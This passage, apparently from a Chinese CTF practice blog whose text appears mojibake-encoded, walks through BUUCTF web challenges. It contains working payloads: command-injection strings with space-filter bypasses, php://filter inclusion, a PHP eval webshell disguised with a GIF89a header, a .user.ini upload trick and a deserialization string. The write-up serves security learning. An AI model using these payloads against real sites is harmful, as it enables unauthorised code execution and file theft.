<p>å°è¯•æŸ¥çœ‹127.0.0.1|cat ../../../flag</p>
<p>å¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417120814848.png" alt="image-20210417120814848"></p>
<p>ä¹Ÿå¯ä»¥ç”¨cat /flag</p>
<p>é¢˜ç›®åˆ©ç”¨äº†å‘½ä»¤æ‰§è¡Œ</p>
<p>ç®¡é“ç¬¦</p>
<pre class="language-python" data-language="python"><code class="language-python">1ã€|ï¼ˆå°±æ˜¯æŒ‰ä½æˆ–ï¼‰ï¼Œç›´æ¥æ‰§è¡Œ|åé¢çš„è¯­å¥

2ã€||ï¼ˆå°±æ˜¯é€»è¾‘æˆ–ï¼‰ï¼Œå¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥

3ã€&amp;ï¼ˆå°±æ˜¯æŒ‰ä½ä¸ï¼‰ï¼Œ&amp;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡

4ã€&amp;&amp;ï¼ˆå°±æ˜¯é€»è¾‘ä¸ï¼‰ï¼Œå¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤

5ã€Linuxä¸­  ; å‰åéƒ½æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡ï¼ŒåŒ&amp;ï¼Œ</code></pre>

<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p>é¢˜ç›®æ˜¯includeçŒœæµ‹æ˜¯æ–‡ä»¶åŒ…å«ï¼›</p>
<p>ç‚¹å‡»tipsåè·³è½¬åˆ°äº†file=flag.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122756590.png" alt="image-20210417122756590"></p>
<p>ç”¨php://inputæ—¶æç¤º</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122817720.png" alt="image-20210417122817720"></p>
<p>ç„¶åå°è¯•ç”¨php://filter</p>
<p>æ„é€ payload</p>
<p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122714033.png" alt="image-20210417122714033"></p>
<p>æœ€åç”¨base64è§£ç å°±èƒ½å¾—åˆ°flag</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p>æ–‡ä»¶å¯ä¸Šä¼ <br>çŸ¥é“æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„<br>ä¸Šä¼ æ–‡ä»¶å¯ä»¥è¢«è®¿é—®<br>ä¸Šä¼ æ–‡ä»¶å¯ä»¥è¢«æ‰§è¡Œ</p>
<p>è¿›å»çœ‹åˆ°è¿™ä¸ªç•Œé¢æ„Ÿè§‰æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨èœåˆ€è¿æ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210105533.png" alt="image-20210417210105533"></p>
<p>è¯•ä¸€ä¸‹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210447264.png" alt="image-20210417210447264"></p>
<p>è¿æ¥æˆåŠŸ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210315253.png" alt="image-20210417210315253"></p>
<p>ç„¶ååœ¨æ ¹ç›®å½•ä¸‹å‘ç°flagçš„æ–‡ä»¶ï¼Œè¿›å…¥åæ‰¾åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210429525.png" alt="image-20210417210429525"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>è¿›å»åçœ‹åˆ°æ˜¯ä¸ªå¹¿å‘Šé¡µï¼Œç›´æ¥æŸ¥çœ‹æºç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418123059855.png" alt="image-20210418123059855"></p>
<p>å‘ç°æœ‰ä¸ªSecret.phpï¼Œè¿›å…¥ä¹‹å</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418123139740.png" alt="image-20210418123139740"></p>
<p>ç”¨bpæŠ“åŒ…ç„¶åå…ˆåŠ ä¸ªReferer: <a target="_blank" rel="noopener" href="https://www.sycsecret.com/">https://www.Sycsecret.com</a></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418124012851.png" alt="image-20210418124012851"></p>
<p>çœ‹åˆ°è¦ç”¨Syclover æµè§ˆå™¨</p>
<p>æ‰€ä»¥æŠŠUser-Agenté‡Œçš„å†…å®¹æ”¹æˆUser-Agent: Syclover</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418124154554.png" alt="image-20210418124154554"></p>
<p>æç¤ºè¦æœ¬åœ°è®¿é—®</p>
<p>æ‰€ä»¥åŠ ä¸ªX-Forwarded-For:127.0.0.1ï¼ˆæˆ‘ä¸‹äº†ä¸ªfakeipçš„æ’ä»¶ï¼‰</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418125120122.png" alt="image-20210418125120122"></p>
<h4 id="httpè¯·æ±‚æŠ¥å¤´"><a href="#httpè¯·æ±‚æŠ¥å¤´" class="headerlink" title="httpè¯·æ±‚æŠ¥å¤´"></a><strong>httpè¯·æ±‚æŠ¥å¤´</strong></h4><p>è¯·æ±‚æŠ¥å¤´é€šçŸ¥æœåŠ¡å™¨å…³äºå®¢æˆ·ç«¯æ±‚æ±‚çš„ä¿¡æ¯ï¼Œå…¸å‹çš„è¯·æ±‚å¤´æœ‰ï¼š</p>
<p><strong>X-Forwarded-For æ˜¯ä¸€ä¸ª HTTP æ‰©å±•å¤´éƒ¨ã€‚ç”¨æ¥è¡¨ç¤º HTTP è¯·æ±‚ç«¯çœŸå® IPã€‚</strong></p>
<p><strong>Refererï¼šè¡¨ç¤ºè¿™æ˜¯è¯·æ±‚æ˜¯ä»å“ªä¸ªURLè¿›æ¥çš„</strong></p>
<p>Hostï¼šè¯·æ±‚çš„ä¸»æœºåï¼Œå…è®¸å¤šä¸ªåŸŸååŒå¤„ä¸€ä¸ªIPåœ°å€ï¼Œå³è™šæ‹Ÿä¸»æœº</p>
<p><strong>User-Agentï¼šå‘é€è¯·æ±‚çš„æµè§ˆå™¨ç±»å‹ã€æ“ä½œç³»ç»Ÿç­‰ä¿¡æ¯</strong></p>
<p>Acceptï¼šå®¢æˆ·ç«¯å¯è¯†åˆ«çš„å†…å®¹ç±»å‹åˆ—è¡¨ï¼Œç”¨äºæŒ‡å®šå®¢æˆ·ç«¯æ¥æ”¶é‚£äº›ç±»å‹çš„ä¿¡æ¯</p>
<p>Accept-Encodingï¼šå®¢æˆ·ç«¯å¯è¯†åˆ«çš„æ•°æ®ç¼–ç </p>
<p>Accept-Languageï¼šè¡¨ç¤ºæµè§ˆå™¨æ‰€æ”¯æŒçš„è¯­è¨€ç±»å‹</p>
<p>Connectionï¼šå…è®¸å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æŒ‡å®šä¸è¯·æ±‚/å“åº”è¿æ¥æœ‰å…³çš„é€‰é¡¹ï¼Œä¾‹å¦‚è¿™æ˜¯ä¸ºKeep-Aliveåˆ™è¡¨ç¤ºä¿æŒè¿æ¥ã€‚</p>
<p>Transfer-Encodingï¼šå‘ŠçŸ¥æ¥æ”¶ç«¯ä¸ºäº†ä¿è¯æŠ¥æ–‡çš„å¯é ä¼ è¾“ï¼Œå¯¹æŠ¥æ–‡é‡‡ç”¨äº†ä»€ä¹ˆç¼–ç æ–¹å¼ã€‚</p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>è¿›å…¥åå…ˆæ ¹æ®é¢˜ç›®è¯•ä¸€ä¸‹?ip=127.0.0.1</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145218124.png" alt="image-20210418145218124"></p>
<p>å†ç”¨lsæŸ¥çœ‹å‘ç°å­˜åœ¨flag.phpå’Œindex.phpä¸¤ä¸ªæ–‡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145306532.png" alt="image-20210418145306532"></p>
<p>å°è¯•ç›´æ¥æŸ¥çœ‹flag.phpå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145349850.png" alt="image-20210418145349850"></p>
<p>ç»•è¿‡ç©ºæ ¼æ–¹å¼</p>
<pre class="language-none"><code class="language-none">$&#123;IFS&#125;æ›¿æ¢
$IFS$1æ›¿æ¢
$&#123;IFSæ›¿æ¢
%20æ›¿æ¢
&lt;å’Œ&lt;&gt;é‡å®šå‘ç¬¦æ›¿æ¢
%09æ›¿æ¢</code></pre>

<p>$IFSæ˜¯bashä¸­çš„å†…éƒ¨åŸŸåˆ†éš”ç¬¦ï¼Œå¯ä»¥ä»£æ›¿ç©ºæ ¼è‡³äºåé¢çš„$9æ•°å­—æ˜¯å¯ä»¥éšæ„çš„</p>
<p>å‘ç°åˆ©ç”¨$IFS$1å¯ä»¥ç»•è¿‡ï¼Œä½†flagä¹Ÿè¢«è¿‡æ»¤äº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145543298.png" alt="image-20210418145543298"></p>
<p>äºæ˜¯å…ˆæŸ¥çœ‹index.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145608672.png" alt="image-20210418145608672"></p>
<p>ç™¾åº¦ä¹‹åæ‰¾åˆ°ä¸€ç§åˆ©ç”¨å†…è”çš„payload</p>
<p>?ip=127.0.0.1;cat$IFS$1 <code>ls</code></p>
<p>å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418150550054.png" alt="image-20210418150550054"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46184013/article/details/107061110">GXYCTF2019]Ping Ping Ping åšé¢˜æ€»ç»“_å­™å¾—åŠ²çš„åšå®¢-CSDNåšå®¢</a></p>
<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42812036/article/details/104297163">GXYCTF2019]Ping Ping Ping {å‘½ä»¤æ‰§è¡Œæ€»ç»“}_æ˜‚é¦–ä¸‹æ¥¼æ¢¯çš„åšå®¢-CSDNåšå®¢</a></p>
<p>ä¸€äº›å…¶ä»–çš„ç»•è¿‡æ–¹å¼</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>è¿›å…¥åæ˜¯ä¸ªè®¡ç®—å™¨ï¼ŒæŸ¥çœ‹æºç åå‘ç°</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424173536708.png" alt="image-20210424173536708"></p>
<p>æŸ¥çœ‹calc.phpçœ‹åˆ°phpä»£ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424173603735.png" alt="image-20210424173603735"></p>
<p>çœ‹åˆ°è¿‡æ»¤æ‰äº†å¾ˆå¤šå­—ç¬¦</p>
<p>å°è¯•ä¼ å…¥å‚æ•°å‘ç°ä»…èƒ½ä¼ å…¥æ•°å­—</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424174247126.png" alt="image-20210424174247126"></p>
<p>ç™¾åº¦åå¾—çŸ¥è¿™é‡Œè®¾ç½®äº†waf</p>
<p>å¯ä»¥åˆ©ç”¨phpåœ¨è§£æå­—ç¬¦ä¸²æ—¶ä¼šåˆ é™¤ç©ºç™½ç¬¦å¹¶å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿çš„ç‰¹æ€§ç»•è¿‡</p>
<p>æ‰€ä»¥å°è¯•åœ¨numå‰åŠ ç©ºæ ¼</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424174652548.png" alt="image-20210424174652548"></p>
<p>ç»•è¿‡æˆåŠŸ</p>
<p>æ¥ä¸‹æ¥å°è¯•æ„é€ å‘½ä»¤å¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424175021538.png" alt="image-20210424175021538"></p>
<p>åˆ©ç”¨scandirå‡½æ•°å¯è¯»å–ç›®å½•</p>
<p>ç”±äº/è¢«è¿‡æ»¤</p>
<p>æ‰€ä»¥åˆ©ç”¨chrå‡½æ•°ç»•è¿‡</p>
<p>æ„é€ </p>
<p>[node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)))](<a target="_blank" rel="noopener" href="http://node3.buuoj.cn:26183/calc.php">http://node3.buuoj.cn:26183/calc.php</a>? num=print_r(scandir(chr(47))</p>
<p>å¾—åˆ°</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424175958985.png" alt="image-20210424175958985"></p>
<p>çœ‹åˆ°æœ‰ä¸ªf1agg</p>
<p>åˆ©ç”¨readfileæˆ–è€…file_get_contentsæŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶</p>
<p>? num=print_r(file_get_contents(chr(47).f1agg))</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424180753601.png" alt="image-20210424180753601"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>å…ˆåšä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä¸Šä¼ åæ˜¾ç¤º</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424222521044.png" alt="image-20210424222521044"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184048567.png" alt="image-20210424184048567"></p>
<p>ç”¨bpæŠ“åŒ…ç„¶åä¿®æ”¹Content-Typeä¸ºimage/jpeg</p>
<p>  Content-Typeï¼ˆå†…å®¹ç±»å‹ï¼‰ï¼Œä¸€èˆ¬æ˜¯æŒ‡ç½‘é¡µä¸­å­˜åœ¨çš„ Content-Typeï¼Œç”¨äºå®šä¹‰ç½‘ç»œæ–‡ä»¶çš„ç±»å‹å’Œç½‘é¡µçš„ç¼–ç ï¼Œå†³å®šæµè§ˆå™¨å°†ä»¥ä»€ä¹ˆå½¢å¼ã€ä»€ä¹ˆç¼–ç è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191606823.png" alt="image-20210424191606823"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184352223.png" alt="image-20210424184352223"></p>
<p>æ”¾åŒ…ååˆæ˜¾ç¤ºä¸èƒ½ä¸ºphp</p>
<p>ç™¾åº¦å¾—çŸ¥ç»•è¿‡åç¼€çš„æœ‰æ–‡ä»¶æ ¼å¼æœ‰php,</p>
<p>,php4,php5,phtml.pht</p>
<p>è¯•ä¸€è¯•</p>
<p>å‘ç°å¯ç”¨phtmlç»•è¿‡</p>
<p>ä½†åˆæç¤º</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184937815.png" alt="image-20210424184937815"></p>
<p>æŠŠæ–‡ä»¶å†…å®¹æ”¹ä¸º</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191120947.png" alt="image-20210424191120947"></p>
<p>åˆæç¤º</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191418367.png" alt="image-20210424191418367"></p>
<p>åœ¨ä¸€å¥è¯æœ¨é©¬å‰åŠ ä¸ªæ–‡ä»¶å¤´GIF89a(GIF89aå›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—)</p>
<p>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;<br>Content-Type: image/jpeg</p>
<p>GIF89a<script language="php"> @eval($_POST["a"]);</script></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p>çŒœæµ‹ä¸Šä¼ åœ°å€ä¸º/upload/</p>
<p>èœåˆ€è¿æ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424190843452.png" alt="image-20210424190843452"></p>
<p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424190943560.png" alt="image-20210424190943560"></p>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆä¼ ä¸ªä¸€å¥è¯æœ¨é©¬è¯•è¯•</p>
<p>å¼¹å‡ºjsï¼Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215707910.png" alt="image-20210424215707910"></p>
<p>çœ‹ä¸€ä¸‹æºç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215933835.png" alt="image-20210424215933835"></p>
<p>æŠŠè¿™ä¸ªäº‹ä»¶removeæ‰</p>
<p>ä¸Šä¼ ååˆæç¤º</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215102729.png" alt="image-20210424215102729"></p>
<p>è¯•è¯•æ”¹æ”¹åç¼€åï¼Œå‘ç°phtmlå¯ä»¥æˆåŠŸä¸Šä¼ </p>
<p>èœåˆ€è¿æ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424221314425.png" alt="image-20210424221314425"></p>
<p>åœ¨è™šæ‹Ÿç»ˆç«¯ä¸­åˆ©ç”¨catå‘½ä»¤æ‰¾åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424221437332.png" alt="image-20210424221437332"></p>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>æ ¹æ®é¢˜ç›®å¾—çŸ¥æœ‰.bakçš„å¤‡ä»½æ–‡ä»¶ï¼Œè®¿é—®ä¸€ä¸‹index.php.bakå¾—åˆ°å¤‡ä»½æ–‡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424230600364.png" alt="image-20210424230600364"></p>
<p>ä»£ç å®¡è®¡å¯çŸ¥è¦ä¼ å…¥keyçš„å€¼ä¸strçš„å€¼ç›¸ç­‰ï¼Œä¸”keyåªèƒ½ä¸ºæ•°å­—ç±»å‹</p>
<p>å› ä¸º==æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œæ ¹æ®phpçš„æ€§è´¨å¯ä¼ å…¥?key=123</p>
<p>å¾—åˆ°flag</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>åˆ°payflagçš„é¡µé¢å‘ç°æœ‰ä¸¤ä¸ªæ¡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424234920389.png" alt="image-20210424234920389"></p>
<p>æŸ¥çœ‹æºç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235003731.png" alt="image-20210424235003731"></p>
<p>æŠ“ä¸ªåŒ…</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235104576.png" alt="image-20210424235104576"></p>
<p>å°†useræ”¹ä¸º1å¯æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235148397.png" alt="image-20210424235148397"></p>
<p>ä¹‹åè¦ä»¥postæ–¹å¼ä¼ å…¥ä¸€ä¸ªå€¼ä»¤å…¶ç­‰äº404ä¸”ä¸èƒ½ä¸ºçº¯æ•°å­—</p>
<p>æ‰€ä»¥post password=404a</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235248917.png" alt="image-20210424235248917"></p>
<p>æç¤ºè¦pay for the flag</p>
<p>çŒœæµ‹è¦postè¿›money=100000000</p>
<p>ä¼ å…¥åæç¤ºæ•°å­—è¿‡é•¿</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235409212.png" alt="image-20210424235409212"></p>
<p>é‡‡ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œå¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235455547.png" alt="image-20210424235455547"></p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>è¿›å…¥åçœ‹èµ·æ¥åƒæ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„é¢˜</p>
<p>å…ˆä¼ ä¸€ä¸ªæ­£å¸¸çš„</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501165659496.png" alt="image-20210501165659496"></p>
<p>æç¤ºillegal suffix!éæ³•åç¼€</p>
<p>æ”¹ä¸ªåç¼€åè¯•è¯•</p>
<p>æ”¹æˆ.jpgæ–‡ä»¶åæˆåŠŸç»•è¿‡ï¼Œä½†åˆæç¤º&lt;? in contents!</p>
<p>çŒœæµ‹&lt;?è¢«è¿‡æ»¤äº†</p>
<p>ä¿®æ”¹å</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501165911275.png" alt="image-20210501165911275"></p>
<p>æœ€åå†åŠ ä¸ªGIF89aæ–‡ä»¶å¤´ï¼Œç»•è¿‡æœ€åä¸€ä¸ªexif_imagetypeå‡½æ•°çš„æ£€æµ‹</p>
<p>è™½ç„¶æˆåŠŸä¸Šä¼ äº†ä½†èœåˆ€æ— æ³•è¿æ¥</p>
<p>ç™¾åº¦ä¸€ä¸‹wp</p>
<p><strong>.user.ini</strong></p>
<p>ã€€1ã€auto_prepend_file åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶<br>ã€€2ã€auto_append_file åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶</p>
<p>æŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œå¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚åœ¨å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶</p>
<p>å†ä¸Šä¼ ä¸€ä¸ª.user.ini</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501170533467.png" alt="image-20210501170533467"></p>
<p>ä¸Šä¼ åæˆ‘ä»¬è®¿é—®æ­¤ç›®å½•ä¸‹çš„ä»»ä½•ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå»åŒ…å«first.jpg,</p>
<p>æ ¹æ®å…¶è¿”å›çš„åœ°å€ç”¨èœåˆ€è¿æ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501174943263.png" alt="image-20210501174943263"></p>
<p>æ‰¾åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501174705927.png" alt="image-20210501174705927"></p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501204543745.png" alt="image-20210501204543745"></p>
<p>çœ‹è§file_get_contents(),åˆ©ç”¨ä¼ªåè®®data://text/plain;base64ç»•è¿‡</p>
<p>å†åˆ©ç”¨php://filterè¯»å–uselesså†…çš„å†…å®¹</p>
<p>è§£ç å</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501183046395.png" alt="image-20210501183046395"></p>
<p>å¯çŸ¥flagåœ¨flag.phpä¸­</p>
<p>è¯•å›¾è®©file=flag.php</p>
<p>çœ‹åˆ°unserializeå‡½æ•°ï¼Œåˆ©ç”¨phpååºåˆ—åŒ–</p>
<p>æ„é€ payload</p>
<p>ï¼Ÿtext=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501205224647.png" alt="image-20210501205224647"></p>
<p>æŸ¥çœ‹æºç æ‰¾åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501205239104.png" alt="image-20210501205239104"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>é¡µé¢ä¸­æç¤ºæœ‰å¤‡ä»½æ–‡ä»¶ï¼Œå¾¡å‰‘æ‰«ä¸€é</p>
<p>æ‰¾åˆ°å­˜åœ¨<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220739803.png" alt="image-20210501220739803"></p>
